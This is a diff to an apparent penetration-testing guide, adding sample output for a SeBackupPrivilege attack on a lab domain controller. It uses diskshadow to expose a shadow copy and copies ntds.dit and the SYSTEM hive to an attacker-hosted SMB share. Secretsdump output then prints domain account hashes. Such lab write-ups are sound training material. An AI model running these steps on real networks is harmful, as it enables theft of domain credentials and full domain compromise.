@@ -65,10 +65,58 @@ unix2dos vss.dsh
 diskshadow /s C:\ProgramData\vss.dsh
 ```
 
+```console {class="sample-code"}
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> diskshadow /s C:\ProgramData\vss.dsh
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  DC01,  9/24/2024 5:54:17 PM
+
+-> set context persistent nowriters
+-> set metadata c:\windows\tasks\test.cab
+-> set verbose on
+-> add volume c: alias test
+-> create
+
+Alias test for shadow ID {89fcc72a-ef5d-4fc0-9f6c-c936c3ce6491} set as environment variable.
+Alias VSS_SHADOW_SET for shadow set ID {fa58db67-4686-4a2b-8f7e-2bc95503aa4a} set as environment variabl
+Inserted file Manifest.xml into .cab file test.cab
+Inserted file DisAF3.tmp into .cab file test.cab
+
+Querying all shadow copies with the shadow copy set ID {fa58db67-4686-4a2b-8f7e-2bc95503aa4a}
+
+        * Shadow copy ID = {89fcc72a-ef5d-4fc0-9f6c-c936c3ce6491}               %test%
+                - Shadow copy set: {fa58db67-4686-4a2b-8f7e-2bc95503aa4a}       %VSS_SHADOW_SET%
+                - Original count of shadow copies = 1
+                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
+                - Creation time: 9/24/2024 5:54:18 PM
+                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+                - Originating machine: DC01.BLACKFIELD.local
+                - Service machine: DC01.BLACKFIELD.local
+                - Not exposed
+                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
+                - Attributes:  No_Auto_Release Persistent No_Writers Differential
+
+Number of shadow copies listed: 1
+-> expose %test% x:
+-> %test% = {89fcc72a-ef5d-4fc0-9f6c-c936c3ce6491}
+The shadow copy was successfully exposed as x:\.
+->
+```
+
 #### 3. Host a smb server (In Linux)
 
 ```console
 impacket-smbserver share . -smb2support
+```
+
+```console {class="sample-code"}
+$ impacket-smbserver share . -smb2support                                  
+Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+...[SNIP]...
 ```
 
 #### 4. Copy to local Linux
@@ -77,16 +125,46 @@ impacket-smbserver share . -smb2support
 net use \\<LOCAL_IP>\share
 ```
 
+```console {class="sample-code"}
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> net use \\10.10.14.31\share
+The command completed successfully.
+```
+
 ```console
 Copy-FileSeBackupPrivilege x:\Windows\ntds\ntds.dit \\<LOCAL_IP>\share\ntds.dit
+```
+
+```console {class="sample-code"}
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> Copy-FileSeBackupPrivilege x:\Windows\ntds\ntds.dit \\10.10.14.31\share\ntds.dit
 ```
 
 ```console
 reg.exe save hklm\system \\<LOCAL_IP>\share\system
 ```
 
+```console {class="sample-code"}
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> reg.exe save hklm\system \\10.10.14.31\share\system
+```
+
 #### 5. Secrets dump
 
 ```console
 impacket-secretsdump -ntds ntds.dit -system system LOCAL
+```
+
+```console {class="sample-code"}
+$ impacket-secretsdump -ntds ntds.dit -system system LOCAL
+Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+
+[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
+...[SNIP]...
+[*] Cleaning up...
 ```
